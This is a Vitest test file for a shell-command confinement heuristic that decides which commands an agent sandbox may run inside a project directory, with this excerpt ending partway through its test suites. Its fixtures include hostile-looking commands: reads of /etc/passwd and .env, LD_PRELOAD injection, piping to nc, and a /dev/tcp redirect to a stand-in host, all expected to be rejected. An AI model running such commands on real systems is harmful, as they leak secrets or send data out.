import { describe, it, expect, beforeAll, afterAll } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { getCwdConfinementPermission } from "../../../src/modules/sandbox/heuristics";
import type { SandboxConfigCwdConfinement } from "../../../src/common/config";

const CWD = "/project";

interface HeuristicTest {
    desc: string;
    command: string;
    config?: SandboxConfigCwdConfinement;
    expected: "allow:sandbox" | "allow" | undefined;
}

const runTests = (tests: HeuristicTest[]) => {
    it.each(tests)("$desc", (test) => {
        expect(getCwdConfinementPermission(test.command, CWD, test.config ?? {})).toBe(
            test.expected,
        );
    });
};

describe("getCwdConfinementPermission", () => {
    describe("known commands within cwd", () => {
        runTests([
            { desc: "relative path", command: "cat file.txt", expected: "allow:sandbox" },
            { desc: "absolute path inside cwd", command: "cat /project/file.txt", expected: "allow:sandbox" },
            { desc: "nested relative path", command: "cat src/index.ts", expected: "allow:sandbox" },
            { desc: "dot path", command: "ls ./src", expected: "allow:sandbox" },
            { desc: "no arguments (reads stdin/cwd)", command: "cat", expected: "allow:sandbox" },
            { desc: "flags only", command: "ls -la", expected: "allow:sandbox" },
            { desc: "cwd itself", command: "ls /project", expected: "allow:sandbox" },
            { desc: "path with .. staying inside", command: "cat src/../README.md", expected: "allow:sandbox" },
            { desc: "multiple files", command: "cat a.txt b.txt c.txt", expected: "allow:sandbox" },
            { desc: "value flag consumed", command: "head -n 5 file.txt", expected: "allow:sandbox" },
            { desc: "value flag inline (short)", command: "head -n5 file.txt", expected: "allow:sandbox" },
            { desc: "value flag inline (long)", command: "head --lines=5 file.txt", expected: "allow:sandbox" },
            { desc: "double dash separator", command: "cat -- -weird-name", expected: "allow:sandbox" },
            { desc: "lone dash (stdin)", command: "cat -", expected: "allow:sandbox" },
            { desc: "no positional args command", command: "pwd", expected: "allow:sandbox" },
            { desc: "ignore positionals command", command: "echo hello world", expected: "allow:sandbox" },
            { desc: "env assignment prefix", command: "FOO=bar cat file.txt", expected: "allow:sandbox" },
            { desc: "quoted path", command: 'cat "my file.txt"', expected: "allow:sandbox" },
            { desc: "cd changes cwd for following command", command: "cd src && cat index.ts", expected: "allow:sandbox" },
            { desc: "cd keeps confinement rooted at the original cwd", command: "cd src && cat ../README.md", expected: "allow:sandbox" },
            { desc: "cd parent escape is rejected", command: "cd src && cat ../../outside.txt", expected: undefined },
            { desc: "cd - returns to the previous cwd", command: "cd src && cd - && cat README.md", expected: "allow:sandbox" },
            { desc: "cd home is rejected", command: "cd && cat README.md", expected: undefined },
            { desc: "pushd and popd restore cwd", command: "pushd src && cat index.ts && popd && cat README.md", expected: "allow:sandbox" },
            { desc: "nested pushd/popd uses a stack", command: "pushd src && pushd lib && cat file.ts && popd && cat ../README.md && popd", expected: "allow:sandbox" },
            { desc: "pushd outside cwd falls back", command: "pushd /tmp && cat file.txt", expected: undefined },
            { desc: "unsupported pushd rotation falls back", command: "pushd", expected: undefined },
            { desc: "indexed pushd rotation falls back", command: "pushd +1", expected: undefined },
        ]);
    });

    describe("complex directory state", () => {
        runTests([
            {
                desc: "directory state persists across lines",
                command: "cd src\npushd lib\ncat file.ts\npopd\ncat ../README.md",
                expected: "allow:sandbox",
            },
            {
                desc: "cd and stack operations compose",
                command: "cd src && pushd ../tests && cd .. && popd && cat ../README.md",
                expected: "allow:sandbox",
            },
            {
                desc: "multiple pushd/popd pairs return to root",
                command: "pushd src && pushd lib && popd && pushd tests && popd && popd && cat README.md",
                expected: "allow:sandbox",
            },
            {
                desc: "stacked directory traversal cannot escape after restore",
                command: "pushd src && pushd lib && popd && popd && cat ../../outside.txt",
                expected: undefined,
            },
            {
                desc: "pipeline cd does not change the following command cwd",
                command: "cd src | cat ../README.md",
                expected: undefined,
            },
            {
                desc: "background cd does not change the following command cwd",
                command: "cd src & cat ../README.md",
                expected: undefined,
            },
            {
                desc: "directory expansion is not guessed",
                command: "pushd \"$(echo src)\" && cat file.ts",
                expected: undefined,
            },
            {
                desc: "sensitive directory is rejected",
                command: "pushd .git && cat config",
                expected: undefined,
            },
        ]);
    });

    describe("directory edge cases", () => {
        runTests([
            { desc: "cd with --", command: "cd -- src && cat file.ts", expected: "allow:sandbox" },
            { desc: "cd logical mode", command: "cd -L src && cat file.ts", expected: "allow:sandbox" },
            { desc: "cd physical mode", command: "cd -P src && cat file.ts", expected: "allow:sandbox" },
            { desc: "cd relative dot path", command: "cd ./src/../src && cat file.ts", expected: "allow:sandbox" },
            { desc: "cd to project root from a child", command: "cd src && cd .. && cat README.md", expected: "allow:sandbox" },
            { desc: "cd above project root falls back", command: "cd src && cd ../.. && cat file.txt", expected: undefined },
            { desc: "cd - before a previous directory falls back", command: "cd - && cat file.txt", expected: undefined },
            { desc: "repeated cd - toggles directories", command: "cd src && cd - && cd - && cat file.txt", expected: "allow:sandbox" },
            { desc: "pushd with --", command: "pushd -- src && popd -- && cat README.md", expected: "allow:sandbox" },
            { desc: "pushd parent traversal staying inside", command: "pushd src && pushd .. && popd && cat file.txt", expected: "allow:sandbox" },
            { desc: "pushd parent traversal escaping", command: "pushd src && pushd ../.. && cat file.txt", expected: undefined },
            { desc: "popd after cd restores stack top", command: "pushd src && cd .. && popd && cat file.txt", expected: "allow:sandbox" },
            { desc: "empty popd leaves cwd unchanged", command: "popd && cat README.md", expected: "allow:sandbox" },
            { desc: "directory variable expansion falls back", command: "cd \"$PWD/src\" && cat file.ts", expected: undefined },
            { desc: "directory glob expansion falls back", command: "pushd src/* && cat file.ts", expected: undefined },
            { desc: "directory redirection is conservatively classified", command: "cd src > cd.log && cat file.ts", expected: undefined },
            { desc: "relative output path uses tracked cwd", command: "cd src && sort -o ../sorted.txt input.txt", expected: "allow:sandbox" },
            { desc: "tracked cwd still checks sensitive paths", command: "cd src && cat ../.env", expected: undefined },
            { desc: "benign assignment before cd", command: "FOO=bar cd src && cat file.ts", expected: "allow:sandbox" },
            { desc: "dangerous assignment before cd", command: "PATH=/tmp cd src && cat file.ts", expected: undefined },
        ]);
    });

    describe("paths outside cwd fall back", () => {
        runTests([
            { desc: "absolute path outside", command: "cat /etc/passwd", expected: undefined },
            { desc: "parent traversal escape", command: "cat ../outside.txt", expected: undefined },
            { desc: "home path outside cwd", command: "cat ~/secrets.txt", expected: undefined },
            { desc: "ls outside dir", command: "ls /tmp", expected: undefined },
            { desc: "flag path value outside", command: "sort -o /tmp/out.txt file.txt", expected: undefined },
            { desc: "unknown long flag with path value", command: "ls --foo=/etc/passwd", expected: undefined },
            { desc: "path flag value outside (inline)", command: "sort --output=/tmp/out file", expected: undefined },
        ]);
    });

    describe("unknown commands fall back", () => {
        runTests([
            { desc: "unknown command", command: "npm install", expected: undefined },
            { desc: "unknown command with in-cwd path", command: "curl ./file.txt", expected: undefined },
            { desc: "command invoked by absolute path", command: "/tmp/evil/cat file.txt", expected: undefined },
            { desc: "command invoked by relative path", command: "./cat file.txt", expected: undefined },
            { desc: "empty command", command: "", expected: undefined },
            { desc: "whitespace command", command: "   ", expected: undefined },
            { desc: "only env assignment", command: "FOO=bar", expected: undefined },
            { desc: "positionals on no-positional command", command: "pwd /project", expected: undefined },
        ]);
    });

    describe("chained and multi-line commands", () => {
        runTests([
            { desc: "pipe of known commands", command: "cat file.txt | grep foo", expected: "allow:sandbox" },
            { desc: "chain with &&", command: "ls src && cat src/index.ts", expected: "allow:sandbox" },
            { desc: "multi-line known commands", command: "cat a.txt\nls b.txt", expected: "allow:sandbox" },
            { desc: "chain with unknown command", command: "cat file.txt && rm -rf x", expected: undefined },
            { desc: "pipe with unknown command", command: "cat file.txt | nc host 80", expected: undefined },
            { desc: "second command escapes cwd", command: "cat a.txt\ncat /etc/passwd", expected: undefined },
        ]);
    });

    describe("redirections", () => {
        runTests([
            { desc: "write within cwd", command: "cat a.txt > b.txt", expected: "allow:sandbox" },
            { desc: "append within cwd", command: "echo hello >> log.txt", expected: "allow:sandbox" },
            { desc: "stderr to /dev/null", command: "ls src 2>/dev/null", expected: "allow:sandbox" },
            { desc: "read from within cwd", command: "wc -l < file.txt", expected: "allow:sandbox" },
            { desc: "write outside cwd", command: "cat a.txt > /tmp/out.txt", expected: undefined },
            { desc: "stderr outside cwd", command: "ls 2> /tmp/err.txt", expected: undefined },
            { desc: "read from outside cwd", command: "wc -l < /etc/passwd", expected: undefined },
        ]);
    });

    describe("grep pattern handling", () => {
        runTests([
            { desc: "pattern skipped, no paths", command: "grep foo file.txt", expected: "allow:sandbox" },
            { desc: "pattern with slash skipped", command: "grep foo/bar file.txt", expected: "allow:sandbox" },
            { desc: "recursive within cwd", command: "grep -rn foo ./src", expected: "allow:sandbox" },
            { desc: "path outside as file arg", command: "grep foo /etc/passwd", expected: undefined },
            { desc: "-e makes all positionals paths", command: "grep -e foo /etc/passwd", expected: undefined },
            { desc: "-e with contained paths", command: "grep -e foo a.txt b.txt", expected: "allow:sandbox" },
            { desc: "inline -e (short) makes positionals paths", command: "grep -efoo /etc/passwd", expected: undefined },
            { desc: "--regexp makes positionals paths", command: "grep --regexp foo /etc/passwd", expected: undefined },
            { desc: "--regexp= inline", command: "grep --regexp=foo /etc/passwd", expected: undefined },
            { desc: "-f pattern file inside cwd", command: "grep -f patterns.txt file.txt", expected: "allow:sandbox" },
            { desc: "-f pattern file outside cwd", command: "grep -f /etc/patterns file.txt", expected: undefined },
        ]);
    });

    describe("sed and stream text filters", () => {
        runTests([
            { desc: "sed prints a line range", command: "sed -n '1,120p' file.txt", expected: "allow:sandbox" },
            { desc: "sed prints a regex range", command: "sed -n '/start/,/end/p' file.txt", expected: "allow:sandbox" },
            { desc: "sed with -e expression", command: "sed -e '1p' -e '5p' file.txt", expected: "allow:sandbox" },
            { desc: "sed substitution", command: "sed 's/foo/bar/g' file.txt", expected: "allow:sandbox" },
            { desc: "sed input outside cwd", command: "sed -n '1,10p' /etc/passwd", expected: undefined },
            { desc: "sed execute command script falls back", command: "sed -n '1e id' file.txt", expected: undefined },
            { desc: "sed script with embedded command substitution falls back", command: "sed -n \"$(grep -n start file.txt),+10p\" file.txt", expected: undefined },
            { desc: "sed write-file script falls back", command: "sed -n '1w /tmp/out' file.txt", expected: undefined },
            { desc: "sed in-place falls back", command: "sed -i 's/a/b/' file.txt", expected: undefined },
            { desc: "sed script file is not inspected", command: "sed -f transform.sed file.txt", expected: undefined },
            { desc: "fold", command: "fold -w 80 README.md", expected: "allow:sandbox" },
            { desc: "fmt", command: "fmt -w 80 README.md", expected: "allow:sandbox" },
            { desc: "expand", command: "expand -t 8 Makefile", expected: "allow:sandbox" },
            { desc: "unexpand", command: "unexpand -a Makefile", expected: "allow:sandbox" },
            { desc: "nl", command: "nl -ba src/index.ts", expected: "allow:sandbox" },
            { desc: "tac", command: "tac -s '\\n' file.txt", expected: "allow:sandbox" },
            { desc: "rev", command: "rev file.txt", expected: "allow:sandbox" },
        ]);
    });

    describe("find safety", () => {
        runTests([
            { desc: "simple find within cwd", command: "find . -name foo", expected: "allow:sandbox" },
            { desc: "find with path", command: "find src -type f", expected: "allow:sandbox" },
            { desc: "find outside cwd", command: "find /etc -name foo", expected: undefined },
            { desc: "find -delete is unsafe", command: "find . -name foo -delete", expected: undefined },
            { desc: "find -exec is unsafe", command: "find . -exec rm {} \\;", expected: undefined },
            { desc: "find -execdir is unsafe", command: "find . -execdir echo {} +", expected: undefined },
            { desc: "find -fprintf is unsafe", command: "find . -fprintf out.txt %p", expected: undefined },
        ]);
    });

    describe("ripgrep", () => {
        runTests([
            { desc: "pattern + file", command: "rg foo src/index.ts", expected: "allow:sandbox" },
            { desc: "type and glob flags", command: "rg -t ts -g '*.test.ts' foo .", expected: "allow:sandbox" },
            { desc: "-e makes all positionals paths (escape)", command: "rg -e foo /etc/passwd", expected: undefined },
            { desc: "-e with contained paths", command: "rg -e foo a.txt b.txt", expected: "allow:sandbox" },
            { desc: "-f pattern file inside cwd", command: "rg -f patterns.txt src", expected: "allow:sandbox" },
            { desc: "-f pattern file outside cwd", command: "rg -f /etc/patterns src", expected: undefined },
            { desc: "inline value flags", command: "rg --max-depth=2 --max-columns=100 foo .", expected: "allow:sandbox" },
            { desc: "--pre runs a program: falls back", command: "rg --pre zstdcat foo .", expected: undefined },
            { desc: "--follow descends into symlinks: falls back", command: "rg --follow foo .", expected: undefined },
        ]);
    });

    describe("fd", () => {
        runTests([
            { desc: "pattern only (searches cwd)", command: "fd foo", expected: "allow:sandbox" },
            { desc: "pattern + path", command: "fd index src", expected: "allow:sandbox" },
            { desc: "value flags", command: "fd -e ts -t f foo", expected: "allow:sandbox" },
            { desc: "path outside cwd", command: "fd foo /etc", expected: undefined },
            { desc: "-x runs a command on results: falls back", command: "fd -x wc {}", expected: undefined },
            { desc: "--exec-batch is unsafe", command: "fd --exec-batch wc {}", expected: undefined },
            { desc: "-L descends into symlinks: falls back", command: "fd -L foo", expected: undefined },
            { desc: "fdfind alias", command: "fdfind foo", expected: "allow:sandbox" },
        ]);
    });

    describe("file comparison", () => {
        runTests([
            { desc: "diff two files", command: "diff a.txt b.txt", expected: "allow:sandbox" },
            { desc: "diff -U with value", command: "diff -U 3 a.txt b.txt", expected: "allow:sandbox" },
            { desc: "diff -r dirs", command: "diff -r src dist", expected: "allow:sandbox" },
            { desc: "diff path outside cwd", command: "diff a.txt /etc/passwd", expected: undefined },
            { desc: "diff -X exclude-from file", command: "diff -X excludes.txt -r src dist", expected: "allow:sandbox" },
            { desc: "diff3", command: "diff3 a.txt b.txt c.txt", expected: "allow:sandbox" },
            { desc: "cmp", command: "cmp a.txt b.txt", expected: "allow:sandbox" },
            { desc: "cmp -n bytes flag", command: "cmp -n 100 a.txt b.txt", expected: "allow:sandbox" },
        ]);
    });

    describe("checksums", () => {
        runTests([
            { desc: "sha256sum file", command: "sha256sum file.txt", expected: "allow:sandbox" },
            { desc: "md5sum check mode", command: "md5sum -c sums.txt", expected: "allow:sandbox" },
            { desc: "cksum multiple files", command: "cksum a.txt b.txt", expected: "allow:sandbox" },
            { desc: "sha256sum outside cwd", command: "sha256sum /etc/passwd", expected: undefined },
        ]);
    });

    describe("binary and compressed readers", () => {
        runTests([
            { desc: "base64 encode file", command: "base64 file.txt", expected: "allow:sandbox" },
            { desc: "base64 decode with output", command: "base64 -w 0 -d enc.b64 -o file.txt", expected: "allow:sandbox" },
            { desc: "base64 input outside cwd", command: "base64 /etc/passwd", expected: undefined },
            { desc: "strings with min length", command: "strings -n 8 binary.bin", expected: "allow:sandbox" },
            { desc: "od format flags", command: "od -A d -t x1 file.bin", expected: "allow:sandbox" },
            { desc: "od outside cwd", command: "od /etc/passwd", expected: undefined },
            { desc: "hexdump", command: "hexdump -C file.bin", expected: "allow:sandbox" },
            { desc: "xxd", command: "xxd -l 16 file.bin", expected: "allow:sandbox" },
            { desc: "xxd -r writes files: falls back", command: "xxd -r out.bin in.hex", expected: undefined },
            { desc: "xxd --post runs a program: falls back", command: "xxd --post gzip file.bin", expected: undefined },
            { desc: "zcat", command: "zcat file.gz", expected: "allow:sandbox" },
            { desc: "zcat outside cwd", command: "zcat /etc/passwd.gz", expected: undefined },
            { desc: "zgrep pattern + file", command: "zgrep foo file.gz", expected: "allow:sandbox" },
            { desc: "zgrep -e makes positionals paths (escape)", command: "zgrep -e foo /etc/passwd.gz", expected: undefined },
        ]);
    });

    describe("archives", () => {
        runTests([
            { desc: "tar list archive", command: "tar -tzf archive.tar.gz", expected: "allow:sandbox" },
            { desc: "tar list with separate -f", command: "tar -t -f archive.tar", expected: "allow:sandbox" },
            { desc: "tar extract: falls back", command: "tar -xzf archive.tar.gz", expected: undefined },
            { desc: "tar create: falls back", command: "tar -czf out.tar.gz src", expected: undefined },
            { desc: "tar --to-command: falls back", command: "tar -tzf a.tar.gz --to-command wc", expected: undefined },
            { desc: "tar archive outside cwd", command: "tar -tzf /opt/a.tar.gz", expected: undefined },
            { desc: "zipinfo list contents", command: "zipinfo archive.zip", expected: "allow:sandbox" },
            { desc: "zipinfo outside cwd", command: "zipinfo /opt/a.zip", expected: undefined },
        ]);
    });

    describe("jq", () => {
        runTests([
            { desc: "filter + file", command: "jq '.name' data.json", expected: "allow:sandbox" },
            { desc: "-n with no file", command: "jq -n '1 + 1'", expected: "allow:sandbox" },
            { desc: "--arg with value", command: "jq --arg x 5 '.x' data.json", expected: "allow:sandbox" },
            { desc: "-f program file inside cwd", command: "jq -f prog.jq data.json", expected: "allow:sandbox" },
            { desc: "-f program file outside cwd", command: "jq -f /etc/prog.jq data.json", expected: undefined },
            { desc: "file outside cwd", command: "jq '.name' /etc/data.json", expected: undefined },
            { desc: "--slurpfile name+file, file slot path-checked", command: "jq --slurpfile x data.json '.x'", expected: "allow:sandbox" },
            { desc: "--slurpfile file slot outside cwd", command: "jq --slurpfile x /etc/data.json '.x'", expected: undefined },
            { desc: "--rawfile file slot outside cwd", command: "jq --rawfile x /etc/data.json '.x'", expected: undefined },
            { desc: "-L module dir inside cwd", command: "jq -L lib '.name' data.json", expected: "allow:sandbox" },
            { desc: "-L module dir outside cwd", command: "jq -L /etc/jq '.name' data.json", expected: undefined },
        ]);
    });

    describe("system utilities", () => {
        runTests([
            { desc: "date", command: "date", expected: "allow:sandbox" },
            { desc: "date with date string", command: "date -d '2024-01-01' -u", expected: "allow:sandbox" },
            { desc: "date reading dates from file", command: "date -f dates.txt", expected: "allow:sandbox" },
            { desc: "date file outside cwd", command: "date -f /etc/hostname", expected: undefined },
            { desc: "sleep", command: "sleep 100", expected: "allow:sandbox" },
            { desc: "which", command: "which node", expected: "allow:sandbox" },
            { desc: "whereis", command: "whereis git", expected: "allow:sandbox" },
            { desc: "type", command: "type -t cat", expected: "allow:sandbox" },
            { desc: "uname", command: "uname -a", expected: "allow:sandbox" },
            { desc: "uname with positional falls back", command: "uname foo", expected: undefined },
            { desc: "hostname", command: "hostname", expected: "allow:sandbox" },
            { desc: "hostname -F file", command: "hostname -F hosts.txt", expected: "allow:sandbox" },
            { desc: "hostname -F outside cwd", command: "hostname -F /etc/hosts", expected: undefined },
            { desc: "nproc", command: "nproc", expected: "allow:sandbox" },
            { desc: "nproc --ignore", command: "nproc --ignore=2", expected: "allow:sandbox" },
            { desc: "free", command: "free -h", expected: "allow:sandbox" },
            { desc: "id", command: "id -u", expected: "allow:sandbox" },
            { desc: "df", command: "df -h .", expected: "allow:sandbox" },
            { desc: "df outside cwd", command: "df /etc", expected: undefined },
        ]);
    });

    describe("git", () => {
        runTests([
            { desc: "git status", command: "git status", expected: "allow:sandbox" },
            { desc: "git status -sb", command: "git status -sb", expected: "allow:sandbox" },
            { desc: "git status with pathspec", command: "git status src", expected: "allow:sandbox" },
            { desc: "git status pathspec outside cwd", command: "git status /etc", expected: undefined },
            { desc: "git status pathspec to .git is sensitive", command: "git status .git", expected: undefined },
            { desc: "git log", command: "git log --oneline -20", expected: "allow:sandbox" },
            { desc: "git log value flags", command: "git log --since 2024-01-01 --author alice -n 5", expected: "allow:sandbox" },
            { desc: "git log rev range", command: "git log main..develop", expected: "allow:sandbox" },
            { desc: "git log -- pathspec", command: "git log -- src/index.ts", expected: "allow:sandbox" },
            { desc: "git log --stat is metadata only", command: "git log --stat -3", expected: "allow:sandbox" },
            { desc: "git log -C is detect-copies, not the global -C", command: "git log -C", expected: "allow:sandbox" },
            { desc: "git log -p prints history contents: falls back", command: "git log -p", expected: undefined },
            { desc: "git log --patch is unsafe", command: "git log --patch", expected: undefined },
            { desc: "git log -U implies patch: falls back", command: "git log -U3", expected: undefined },
            { desc: "git ls-files", command: "git ls-files", expected: "allow:sandbox" },
            { desc: "git ls-files pathspec", command: "git ls-files src", expected: "allow:sandbox" },
            { desc: "git ls-files others", command: "git ls-files -z --others --exclude-standard", expected: "allow:sandbox" },
            { desc: "git describe", command: "git describe --tags", expected: "allow:sandbox" },
            { desc: "git rev-parse", command: "git rev-parse --abbrev-ref HEAD", expected: "allow:sandbox" },
            { desc: "git rev-parse --show-toplevel", command: "git rev-parse --show-toplevel", expected: "allow:sandbox" },
            { desc: "git branch list", command: "git branch -av", expected: "allow:sandbox" },
            { desc: "git branch create: falls back", command: "git branch feature", expected: undefined },
            { desc: "git branch delete: falls back", command: "git branch -d feature", expected: undefined },
            { desc: "git tag list", command: "git tag -n", expected: "allow:sandbox" },
            { desc: "git tag create: falls back", command: "git tag v1.0.0", expected: undefined },
            { desc: "content-printing subcommand diff: falls back", command: "git diff", expected: undefined },
            { desc: "content-printing subcommand show: falls back", command: "git show HEAD", expected: undefined },
            { desc: "credential-printing subcommand remote: falls back", command: "git remote -v", expected: undefined },
            { desc: "config subcommand: falls back", command: "git config --list", expected: undefined },
            { desc: "network subcommand: falls back", command: "git fetch origin", expected: undefined },
            { desc: "mutating subcommand: falls back", command: "git checkout main", expected: undefined },
            { desc: "global -c before subcommand: falls back", command: "git -c diff.external=evil log", expected: undefined },
            { desc: "global -C before subcommand: falls back", command: "git -C /other status", expected: undefined },
            { desc: "global --git-dir before subcommand: falls back", command: "git --git-dir /x log", expected: undefined },
            { desc: "bare git without subcommand: falls back", command: "git", expected: undefined },
            { desc: "git -- status", command: "git -- status", expected: "allow:sandbox" },
        ]);
    });

    describe("flag value model", () => {
        runTests([
            { desc: "long value flag with separate value is consumed", command: "head --lines 5 file.txt", expected: "allow:sandbox" },
            { desc: "long value flags consumed (grep)", command: "grep --max-count 3 --context 2 foo file.txt", expected: "allow:sandbox" },
            { desc: "two-value flag consumes both values (jq --arg)", command: "jq --arg x /etc/passwd '.x' data.json", expected: "allow:sandbox" },
            { desc: "two-value flag with inline form is ineligible", command: "jq --arg=x 5 '.x' data.json", expected: undefined },
            { desc: "value flag missing its value is ineligible", command: "head --lines", expected: undefined },
            { desc: "path flag separate value inside cwd", command: "diff -X excludes.txt a.txt b.txt", expected: "allow:sandbox" },
        ]);
    });

    describe("unzip safe modes", () => {
        runTests([
            { desc: "unzip -l lists contents", command: "unzip -l a.zip", expected: "allow:sandbox" },
            { desc: "unzip --list with member names", command: "unzip --list a.zip src/index.ts", expected: "allow:sandbox" },
            { desc: "unzip -p prints a member to stdout", command: "unzip -p a.zip README.md", expected: "allow:sandbox" },
            { desc: "unzip -t tests integrity", command: "unzip -t a.zip", expected: "allow:sandbox" },
            { desc: "unzip -v verbose list", command: "unzip -v a.zip", expected: "allow:sandbox" },
            { desc: "unzip default mode (extract) falls back", command: "unzip a.zip", expected: undefined },
            { desc: "unzip -d extract directory falls back", command: "unzip -d out a.zip", expected: undefined },
            { desc: "unzip -l archive outside cwd", command: "unzip -l /etc/a.zip", expected: undefined },
            { desc: "tar member names are data, not paths", command: "tar -t a.tar.gz 'src/*'", expected: "allow:sandbox" },
        ]);
    });

    describe("subshells and process substitution", () => {
        runTests([
            { desc: "subshell with known command", command: "cat $(echo file.txt)", expected: "allow:sandbox" },
            { desc: "backtick subshell", command: "cat `echo file.txt`", expected: "allow:sandbox" },
            { desc: "subshell with unknown command", command: "cat $(curl example.com)", expected: undefined },
            { desc: "subshell escaping cwd", command: "cat $(cat /etc/passwd)", expected: undefined },
            { desc: "nested subshells", command: "cat $(echo $(echo file.txt))", expected: "allow:sandbox" },
            { desc: "process substitution known", command: "cat <(echo hi)", expected: "allow:sandbox" },
            { desc: "process substitution unknown", command: "cat <(curl example.com)", expected: undefined },
            { desc: "redirection into process substitution", command: "echo hi > >(cat)", expected: "allow:sandbox" },
            { desc: "redirection into unknown process substitution", command: "echo hi > >(nc host 80)", expected: undefined },
        ]);
    });

    describe("heredocs", () => {
        runTests([
            { desc: "heredoc within cwd", command: "cat << EOF\nhello\nEOF", expected: "allow:sandbox" },
            { desc: "heredoc with path arg", command: "grep foo << EOF\nhello\nEOF", expected: "allow:sandbox" },
        ]);
    });

    describe("parser evasion resistance", () => {
        runTests([
            { desc: "quoted known command name behaves like bash", command: '"cat" file.txt', expected: "allow:sandbox" },
            { desc: "quoted unknown command name", command: '"nc" host 80', expected: undefined },
            { desc: "tab as argument separator", command: "cat\tfile.txt", expected: "allow:sandbox" },
            { desc: "escaped char in command name resolves like bash", command: "c\\at file.txt", expected: "allow:sandbox" },
            { desc: "escaped char does not disguise unknown command", command: "n\\c host 80", expected: undefined },
            { desc: "case-sensitive command names", command: "CAT file.txt", expected: undefined },
            { desc: "empty quotes prefix", command: '""cat file.txt', expected: "allow:sandbox" },
            { desc: "bash -c is not a known command", command: 'bash -c "cat file.txt"', expected: undefined },
            { desc: "sh -c is not a known command", command: "sh -c 'cat file.txt'", expected: undefined },
            { desc: "eval is not a known command", command: "eval cat file.txt", expected: undefined },
            { desc: "env wrapper is not a known command", command: "env cat file.txt", expected: undefined },
            { desc: "command builtin is not a known command", command: "command cat file.txt", expected: undefined },
            { desc: "xargs is not a known command", command: "xargs cat < files.txt", expected: undefined },
            { desc: "sudo is not a known command", command: "sudo cat file.txt", expected: undefined },
            { desc: "time is not a known command", command: "time cat file.txt", expected: undefined },
        ]);
    });

    describe("environment assignments", () => {
        runTests([
            { desc: "benign assignment", command: "FOO=bar cat file.txt", expected: "allow:sandbox" },
            { desc: "multiple benign assignments", command: "FOO=bar BAZ=qux cat file.txt", expected: "allow:sandbox" },
            { desc: "empty assignment value", command: "FOO= cat file.txt", expected: "allow:sandbox" },
            { desc: "LD_PRELOAD is rejected", command: "LD_PRELOAD=/tmp/evil.so cat file.txt", expected: undefined },
            { desc: "LD_LIBRARY_PATH is rejected", command: "LD_LIBRARY_PATH=/tmp cat file.txt", expected: undefined },
            { desc: "PATH assignment is rejected", command: "PATH=/tmp/evil cat file.txt", expected: undefined },
            { desc: "BASH_ENV is rejected", command: "BASH_ENV=/tmp/x cat file.txt", expected: undefined },
            { desc: "IFS is rejected", command: "IFS=x cat file.txt", expected: undefined },
            { desc: "assignment value outside cwd is path-checked", command: "FOO=/etc/passwd cat file.txt", expected: undefined },
            { desc: "assignment value in home is path-checked", command: "FOO=~/x cat file.txt", expected: undefined },
            { desc: "sensitive assignment value is rejected", command: "FOO=.env cat file.txt", expected: undefined },
            // state-relocating names: rejected by NAME even with an in-cwd
            // value (the value would pass the path check on its own)
            { desc: "GIT_DIR assignment is rejected", command: "GIT_DIR=x git status", expected: undefined },
            { desc: "GIT_CONFIG assignment is rejected", command: "GIT_CONFIG=x git log", expected: undefined },
            { desc: "GIT_EXEC_PATH assignment is rejected", command: "GIT_EXEC_PATH=x git status", expected: undefined },
            { desc: "RIPGREP_CONFIG_PATH assignment is rejected", command: "RIPGREP_CONFIG_PATH=x rg needle", expected: undefined },
            { desc: "LESSOPEN assignment is rejected", command: "LESSOPEN=x cat file.txt", expected: undefined },
            { desc: "LESSCLOSE assignment is rejected", command: "LESSCLOSE=x cat file.txt", expected: undefined },
            { desc: "XDG_CONFIG_HOME assignment is rejected", command: "XDG_CONFIG_HOME=x git status", expected: undefined },
        ]);
    });

    describe("export builtin", () => {
        runTests([
            { desc: "export benign assignment", command: "export FOO=bar", expected: "allow:sandbox" },
            { desc: "export in a chain", command: "export FOO=bar && cat file.txt", expected: "allow:sandbox" },
            { desc: "export multiple assignments", command: "export FOO=1 BAR=2 && cat file.txt", expected: "allow:sandbox" },
            { desc: "export bare name", command: "export FOO", expected: "allow:sandbox" },
            { desc: "export empty value", command: "export FOO= && cat file.txt", expected: "allow:sandbox" },
            { desc: "export -n unsets", command: "export -n FOO", expected: "allow:sandbox" },
            { desc: "export value outside cwd is path-checked", command: "export FOO=/etc/passwd", expected: undefined },
            { desc: "export value escaping cwd is path-checked", command: "export FOO=../etc/passwd", expected: undefined },
            { desc: "export value in home is path-checked", command: "export FOO=~/x", expected: undefined },
            { desc: "export sensitive value is rejected", command: "export FOO=.env", expected: undefined },
            { desc: "export GIT_DIR is rejected", command: "export GIT_DIR=x", expected: undefined },
            { desc: "export GIT_WORK_TREE is rejected", command: "export GIT_WORK_TREE=x && git status", expected: undefined },
            { desc: "export LD_PRELOAD is rejected", command: "export LD_PRELOAD=x && cat file.txt", expected: undefined },
            { desc: "export PATH is rejected", command: "export PATH=bin && cat file.txt", expected: undefined },
            { desc: "export RIPGREP_CONFIG_PATH is rejected", command: "export RIPGREP_CONFIG_PATH=x", expected: undefined },
            { desc: "export LESSOPEN is rejected", command: "export LESSOPEN=x", expected: undefined },
            { desc: "export XDG_CONFIG_HOME is rejected", command: "export XDG_CONFIG_HOME=x", expected: undefined },
            { desc: "export -f (function export) is rejected", command: "export -f myfunc", expected: undefined },
            { desc: "export -p (env dump) is rejected", command: "export -p", expected: undefined },
            { desc: "export invalid identifier is rejected", command: "export 'a b=1'", expected: undefined },
            { desc: "export invalid assignment is rejected", command: "export =foo", expected: undefined },
        ]);
    });

    describe("redirection edge cases", () => {
        runTests([
            { desc: "stderr merged into stdout", command: "cat file.txt 2>&1", expected: "allow:sandbox" },
            { desc: "stdout to /dev/stdout", command: "echo hello > /dev/stdout", expected: "allow:sandbox" },
            { desc: "bash network redirect is outside cwd", command: "echo hello > /dev/tcp/evil.example/80", expected: undefined },
            { desc: ">&2 is conservatively rejected", command: "cat file.txt >&2", expected: undefined },
            { desc: "1>&2 is conservatively rejected", command: "cat file.txt 1>&2", expected: undefined },
        ]);
    });

    describe("unsafe flag variants", () => {
        runTests([
            { desc: "sort --compress-program with separate arg", command: "sort --compress-program /tmp/x file.txt", expected: undefined },
            { desc: "sort --compress-program= inline", command: "sort --compress-program=/tmp/x file.txt", expected: undefined },
            { desc: "find -ok prompts per match, still unsafe", command: "find . -ok rm {} \\;", expected: undefined },
            { desc: "grep --dereference-recursive long form", command: "grep --dereference-recursive foo .", expected: undefined },
            { desc: "grep -r without dereference is allowed", command: "grep -r foo .", expected: "allow:sandbox" },
            { desc: "sort with safe flags stays allowed", command: "sort -n -k 2 file.txt", expected: "allow:sandbox" },
        ]);
    });

    describe("chain edge cases", () => {
        runTests([
